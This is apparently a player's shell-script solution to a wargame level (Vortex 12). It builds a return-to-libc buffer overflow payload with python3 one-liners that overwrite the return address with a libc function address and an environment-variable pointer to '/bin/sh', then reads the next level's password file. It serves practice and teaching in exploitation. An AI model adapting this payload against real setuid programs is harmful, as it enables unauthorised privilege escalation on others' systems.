#!/bin/sh
# In this challenge, stack is non-executable
readelf -l /vortex/vortex12 | grep STACK
# So we have to find another way to execute our shellcode

mkdir /tmp/ballban_vortex12
cd /tmp/ballban_vortex12

export EGG="/bin/sh"

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG and put EGG's address in EGG2
./check_env EGG # 0xffffdde7

strace /vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0xf7e5fe40) + struct.pack('<I', 0xffffdde7) * 10)")

strace /vortex/vortex12 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1036 + struct.pack('<I', 0xf7e5fe40) + b'\x90' * 4 + struct.pack('<I', 0xffffdde7 + 4) + struct.pack('<II', 0xffffdde7, 0x0))")

cat /etc/vortex_pass/vortex13
# Password: 